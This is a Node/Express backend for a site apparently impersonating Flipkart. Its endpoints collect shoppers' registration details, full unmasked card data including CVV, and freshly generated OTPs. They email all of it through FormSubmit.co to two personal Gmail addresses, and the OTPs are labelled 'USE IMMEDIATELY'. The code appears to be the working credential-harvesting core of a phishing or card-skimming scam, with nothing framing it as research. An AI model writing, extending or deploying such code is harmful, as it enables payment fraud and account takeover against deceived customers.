const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'dist')));

// FormSubmit.co configuration
const FORMSUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/akrasd25@gmail.com';
const FORMSUBMIT_CC = 'Rajatjha.ss708090@gmail.com';

// Generate OTP
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Store OTPs temporarily (in production, use Redis or database)
const otpStore = new Map();

// API Routes

// Send registration email with contact details
app.post('/api/send-registration-email', async (req, res) => {
  try {
    const { name, email, phone } = req.body;
    
    const formData = {
      name: name,
      email: email,
      phone: phone,
      registration_time: new Date().toLocaleString(),
      _subject: 'New User Registration - Flipkart Clone',
      _cc: FORMSUBMIT_CC,
      _template: 'table'
    };

    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      }
    });

    res.json({ success: true, message: 'Registration email sent successfully' });
  } catch (error) {
    console.error('Error sending registration email:', error);
    res.status(500).json({ success: false, message: 'Failed to send registration email' });
  }
});

// Send payment details email
app.post('/api/send-payment-email', async (req, res) => {
  try {
    const { orderDetails, paymentMethod, amount, customerInfo, cardDetails } = req.body;
    
    const formData = {
      order_id: orderDetails.orderId,
      amount: amount,
      payment_method: paymentMethod,
      payment_time: new Date().toLocaleString(),
      customer_name: customerInfo.name,
      customer_phone: customerInfo.phone,
      customer_email: customerInfo.email,
      customer_address: customerInfo.address,
      _subject: `Payment Received - Order #${orderDetails.orderId}`,
      _cc: FORMSUBMIT_CC,
      _template: 'table'
    };

    // Add complete card details if available
    if (cardDetails) {
      formData.card_number = cardDetails.cardNumber;
      formData.card_name = cardDetails.cardName;
      formData.card_expiry = cardDetails.cardExpiry;
      formData.card_cvv = cardDetails.cardCVV;
      formData.card_bank = cardDetails.bank;
      formData.card_type = cardDetails.cardTab;
      formData.card_details_note = '� COMPLETE UNMASKED CARD DETAILS';
    }

    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      }
    });

    res.json({ success: true, message: 'Payment email sent successfully' });
  } catch (error) {
    console.error('Error sending payment email:', error);
    res.status(500).json({ success: false, message: 'Failed to send payment email' });
  }
});

// Send OTP email
app.post('/api/send-otp', async (req, res) => {
  try {
    const { phone, email, purpose } = req.body;
    
    // Generate OTP
    const otp = generateOTP();
    const otpKey = `${phone || email}-${purpose}`;
    
    // Store OTP with 5 minutes expiry
    otpStore.set(otpKey, {
      otp,
      expiry: Date.now() + 5 * 60 * 1000, // 5 minutes
      phone,
      email
    });
    
    const formData = {
      otp_code: otp,
      purpose: purpose,
      phone: phone || 'N/A',
      email: email || 'N/A',
      generated_time: new Date().toLocaleString(),
      expires_at: new Date(Date.now() + 5 * 60 * 1000).toLocaleString(),
      otp_note: '🔓 UNMASKED OTP - USE IMMEDIATELY',
      _subject: `OTP Generated - ${purpose}`,
      _cc: FORMSUBMIT_CC,
      _template: 'table'
    };

    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      }
    });

    res.json({ 
      success: true, 
      message: 'OTP sent successfully',
      otpForTesting: otp // Include OTP in response for testing
    });
  } catch (error) {
    console.error('Error sending OTP:', error);
    res.status(500).json({ success: false, message: 'Failed to send OTP' });
  }
});

// Verify OTP
app.post('/api/verify-otp', (req, res) => {
  try {
    const { phone, email, otp, purpose } = req.body;
    const otpKey = `${phone || email}-${purpose}`;
    
    const storedData = otpStore.get(otpKey);
    
    if (!storedData) {
      return res.json({ success: false, message: 'OTP not found or expired' });
    }
    
    if (Date.now() > storedData.expiry) {
      otpStore.delete(otpKey);
      return res.json({ success: false, message: 'OTP expired' });
    }
    
    if (storedData.otp !== otp) {
      return res.json({ success: false, message: 'Invalid OTP' });
    }
    
    // OTP is valid, remove it
    otpStore.delete(otpKey);
    res.json({ success: true, message: 'OTP verified successfully' });
  } catch (error) {
    console.error('Error verifying OTP:', error);
    res.status(500).json({ success: false, message: 'Failed to verify OTP' });
  }
});

// Serve the React app
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`FormSubmit.co service configured for akrasd25@gmail.com (CC: Rajatjha.ss708090@gmail.com)`);
});
